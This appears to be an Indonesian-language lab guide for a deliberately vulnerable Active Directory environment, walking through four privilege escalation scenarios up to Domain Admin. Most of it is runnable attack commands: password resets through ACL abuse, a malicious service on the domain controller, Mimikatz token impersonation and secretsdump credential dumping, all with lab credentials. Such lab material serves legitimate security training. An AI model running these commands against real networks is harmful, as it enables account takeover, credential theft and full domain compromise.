# ⬆️ Skenario Serangan: Privilege Escalation

## Gambaran Umum

Privilege escalation adalah proses meningkatkan level akses dari user biasa menjadi admin lokal, lalu ke Domain Admin. Di lab ini, beberapa jalur eskalasi sudah disiapkan.

---

## Skenario 1: Abuse of Weak ACL Permissions

**Tujuan:** Memanfaatkan ACL misconfiguration untuk mereset password user lain.

**MITRE ATT&CK:** T1222.001 — File and Directory Permissions Modification

**Penjelasan:** User `helpdesk` memiliki GenericAll permission pada OU HR. Artinya helpdesk bisa melakukan apa saja terhadap objek di OU tersebut, termasuk mereset password.

**Prasyarat:** Akses sebagai `helpdesk`.

```bash
# Dari Kali — verifikasi permission menggunakan BloodHound
# Di BloodHound GUI, cari node "helpdesk" dan lihat outbound object control

# Reset password l.jones (HR Manager) menggunakan credential helpdesk
# Menggunakan Impacket
impacket-rpcchangepwd corp.local/helpdesk:Helpdesk2024!@192.168.56.10 -newpass "Hacked2024!"
# Atau menggunakan net rpc
net rpc password "l.jones" "Hacked2024!" -U "corp.local/helpdesk%Helpdesk2024!" -S 192.168.56.10

# Sekarang login sebagai l.jones dengan password baru
crackmapexec smb 192.168.56.10 -u "l.jones" -p "Hacked2024!"
```

**Alternatif: menggunakan PowerShell dari mesin Windows (jika sudah punya akses):**

```powershell
# Login sebagai helpdesk, lalu reset password HR user
Set-ADAccountPassword -Identity "l.jones" -Reset -NewPassword (ConvertTo-SecureString "Hacked2024!" -AsPlainText -Force)
```

---

## Skenario 2: Service Misconfiguration (Server Operators Abuse)

**Tujuan:** Memanfaatkan membership Server Operators untuk eskalasi ke Domain Admin.

**MITRE ATT&CK:** T1543.003 — Create or Modify System Process: Windows Service

**Penjelasan:** User `helpdesk` adalah anggota group Server Operators. Group ini memiliki kemampuan untuk mengelola service di Domain Controller, termasuk membuat service baru. Attacker bisa membuat service yang menjalankan payload dan mendapatkan akses sebagai SYSTEM di DC.

**Prasyarat:** Akses sebagai `helpdesk`.

```bash
# Verifikasi helpdesk adalah member Server Operators
crackmapexec smb 192.168.56.10 -u "helpdesk" -p "Helpdesk2024!" --groups

# Menggunakan Impacket services.py untuk membuat service di DC
# Buat service yang menambahkan helpdesk ke Domain Admins
impacket-services corp.local/helpdesk:Helpdesk2024!@192.168.56.10 create \
    -name "EvilSvc" \
    -display "System Update Service" \
    -path 'cmd.exe /c net group "Domain Admins" helpdesk /add /domain'

# Start service
impacket-services corp.local/helpdesk:Helpdesk2024!@192.168.56.10 start -name "EvilSvc"

# Verifikasi helpdesk sekarang Domain Admin
crackmapexec smb 192.168.56.10 -u "helpdesk" -p "Helpdesk2024!" --groups

# Cleanup — hapus service setelah selesai
impacket-services corp.local/helpdesk:Helpdesk2024!@192.168.56.10 delete -name "EvilSvc"
```

---

## Skenario 3: Token Impersonation

**Tujuan:** Impersonate token user lain yang sedang login di mesin yang sama untuk mendapatkan privilege mereka.

**MITRE ATT&CK:** T1134.001 — Access Token Manipulation: Token Impersonation

**Penjelasan:** Di Windows, setiap proses berjalan dengan security token yang merepresentasikan user. Jika attacker memiliki akses admin lokal, mereka bisa "mencuri" token dari proses user lain yang sedang aktif — termasuk Domain Admin yang mungkin sedang login.

**Prasyarat:** Local admin access di mesin dimana user berprivilege tinggi sedang login.

### Simulasi: Login s.admin ke CLIENT01

Pertama, login sebagai `CORP\s.admin` ke CLIENT01 untuk membuat session aktif. Lalu dari sisi attacker:

```bash
# Dari Kali — akses CLIENT01 sebagai helpdesk (local admin)
evil-winrm -i 192.168.56.30 -u helpdesk -p "Helpdesk2024!"
```

Dari shell WinRM di CLIENT01:

```powershell
# Upload Mimikatz ke target
# (transfer mimikatz.exe ke CLIENT01 terlebih dahulu)

# List semua token yang tersedia
.\mimikatz.exe "privilege::debug" "token::list" "exit"

# Impersonate token s.admin (jika sedang login)
.\mimikatz.exe "privilege::debug" "token::elevate /user:s.admin" "exit"

# Atau gunakan incognito (jika menggunakan Meterpreter)
# list_tokens -u
# impersonate_token CORP\\s.admin
```

---

## Skenario 4: Dari Service Account ke Domain Admin

**Tujuan:** Memanfaatkan service account credential yang sudah di-crack untuk mencapai Domain Admin.

**Penjelasan:** Ini menggabungkan beberapa teknik sebelumnya menjadi attack chain lengkap.

### Attack Chain

```
1. Password Spray → dapat credential j.doe (Welcome2024!)
2. SMB Enumeration → temukan deploy_script.bat → dapat credential svc_backup
3. Kerberoasting → konfirmasi password svc_backup (Backup2024!)
4. Cek privilege svc_backup → apakah punya akses ke mesin lain?
5. Lateral movement ke mesin lain → credential dump → cari DA credential
```

```bash
# Step 1: Cek akses svc_backup ke berbagai mesin
crackmapexec smb 192.168.56.10 192.168.56.11 192.168.56.20 192.168.56.30 \
    -u "svc_backup" -p "Backup2024!"

# Step 2: Jika svc_backup punya akses admin di FILESRV
impacket-secretsdump corp.local/svc_backup:Backup2024!@192.168.56.20

# Step 3: Dari hash yang didump, cari credential high-value
# Jika s.admin pernah login di FILESRV, hash-nya ada di memori

# Step 4: Pass-the-Hash menggunakan hash s.admin ke DC
# (lihat skenario Lateral Movement)
```

---

## Attack Path Summary

```
                    ┌─────────────────────┐
                    │   a.intern          │
                    │   (Password Spray)  │
                    └──────────┬──────────┘
                               │
                    ┌──────────▼──────────┐
                    │   j.doe             │
                    │   (SMB Enum)        │
                    └──────────┬──────────┘
                               │
                    ┌──────────▼──────────┐
                    │   svc_backup        │
                    │   (Kerberoast)      │
                    └──────────┬──────────┘
                               │
                    ┌──────────▼──────────┐
                    │   helpdesk          │
                    │   (Server Ops)      │
                    └──────────┬──────────┘
                               │
                    ┌──────────▼──────────┐
                    │   DOMAIN ADMIN      │
                    │   (s.admin / DA)    │
                    └─────────────────────┘
```
